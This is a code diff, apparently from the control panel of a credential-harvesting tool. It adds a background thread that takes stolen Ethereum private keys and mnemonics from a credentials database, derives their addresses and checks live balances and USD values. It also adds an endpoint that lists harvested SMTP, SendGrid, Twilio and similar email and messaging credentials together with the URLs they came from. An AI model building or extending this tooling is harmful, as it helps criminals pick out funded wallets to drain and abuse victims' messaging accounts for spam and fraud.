@@ -3954,6 +3954,88 @@ threading.Thread(
 ).start()
 
 
+def _background_crypto_balance_checker():
+    """Auto-derives ETH address from stored private key and checks on-chain balance
+    for Crypto entries that haven't been verified yet. Processes 3 per cycle at 1/s
+    to respect public RPC rate limits."""
+    import time as _time
+    _time.sleep(20)  # warm-up delay after startup
+    while True:
+        try:
+            conn = sqlite3.connect(DB_PATH, timeout=10)
+            rows = conn.execute(
+                """SELECT id, key_value, metadata FROM credentials
+                   WHERE type IN ('Crypto', 'Mnemonic')
+                   AND (verify_meta IS NULL OR verify_meta = '' OR verify_meta = '{}')
+                   AND status IN ('valid', 'hit')
+                   LIMIT 3"""
+            ).fetchall()
+            conn.close()
+
+            for cred_id, key_value, metadata in rows:
+                try:
+                    address = None
+                    for candidate in [metadata or '', key_value or '']:
+                        clean = candidate.strip().lstrip('0x')
+                        if len(clean) == 64 and all(ch in '0123456789abcdefABCDEF' for ch in clean):
+                            address = _derive_eth_address(clean)
+                            if address:
+                                break
+
+                    if not address:
+                        conn2 = sqlite3.connect(DB_PATH, timeout=10)
+                        conn2.execute(
+                            'UPDATE credentials SET verify_meta=?, last_verified=CURRENT_TIMESTAMP WHERE id=?',
+                            (json.dumps({'error': 'no_derivable_address'}), cred_id))
+                        conn2.commit()
+                        conn2.close()
+                        continue
+
+                    rpc_payload = {'jsonrpc': '2.0', 'method': 'eth_getBalance',
+                                   'params': [address, 'latest'], 'id': 1}
+                    rpc_resp = http_requests.post('https://eth.llamarpc.com',
+                                                  json=rpc_payload, timeout=8)
+                    hex_val = rpc_resp.json().get('result', '0x0') or '0x0'
+                    native = int(hex_val, 16) / 1e18
+
+                    usd_estimate = None
+                    try:
+                        pg = http_requests.get(
+                            'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd',
+                            timeout=5)
+                        if pg.ok:
+                            usd_estimate = round(native * pg.json().get('ethereum', {}).get('usd', 0), 2)
+                    except Exception:
+                        pass
+
+                    vm = json.dumps({
+                        'address': address, 'chain': 'eth',
+                        'balance_native': round(native, 8), 'symbol': 'ETH',
+                        'balance_usd': usd_estimate,
+                        'explorer_url': f'https://etherscan.io/address/{address}',
+                        'source': 'auto',
+                    })
+                    conn3 = sqlite3.connect(DB_PATH, timeout=10)
+                    conn3.execute(
+                        'UPDATE credentials SET verify_meta=?, last_verified=CURRENT_TIMESTAMP WHERE id=?',
+                        (vm, cred_id))
+                    conn3.commit()
+                    conn3.close()
+                    _time.sleep(1)
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        _time.sleep(30)
+
+
+threading.Thread(
+    target=_background_crypto_balance_checker,
+    name='crypto-balance-checker',
+    daemon=True,
+).start()
+
+
 def _build_crack_config_snapshot(addon_ids: list) -> dict:
     """Build a per-session config.json by starting from the controller's
     current config.json and forcing the boolean at each addon's scannerKey
@@ -8675,6 +8757,32 @@ def api_findings_ssh():
                                     'ssh_key', 'SSH_KEYS')
                            AND status IN ('valid', 'hit')
                      ORDER BY id DESC LIMIT 5000''')
+        rows = [_serialize_credential(r) for r in c.fetchall()]
+        conn.close()
+        return jsonify({'ok': True, 'findings': rows})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+@app.route('/api/findings/email', methods=['GET'])
+def api_findings_email():
+    """Unified email / messaging credential findings — all providers in one endpoint."""
+    EMAIL_TYPES = (
+        'SMTP', 'XSMTP',
+        'SendGrid', 'Mailgun', 'Mandrill', 'Postmark', 'Brevo',
+        'MailerSend', 'SparkPost', 'Mailtrap', 'Mailjet', 'Plivo',
+        'Nexmo', 'Telnyx', 'MessageBird', 'Twilio',
+    )
+    try:
+        placeholders = ','.join('?' * len(EMAIL_TYPES))
+        conn = sqlite3.connect(DB_PATH, timeout=30)
+        c = conn.cursor()
+        c.execute(f'''SELECT id, type, key_value, source_url, status, metadata,
+                             timestamp, reported, last_verified, verify_meta
+                      FROM credentials
+                      WHERE type IN ({placeholders})
+                        AND status IN ('valid', 'hit')
+                      ORDER BY id DESC LIMIT 5000''', EMAIL_TYPES)
         rows = [_serialize_credential(r) for r in c.fetchall()]
         conn.close()
         return jsonify({'ok': True, 'findings': rows})
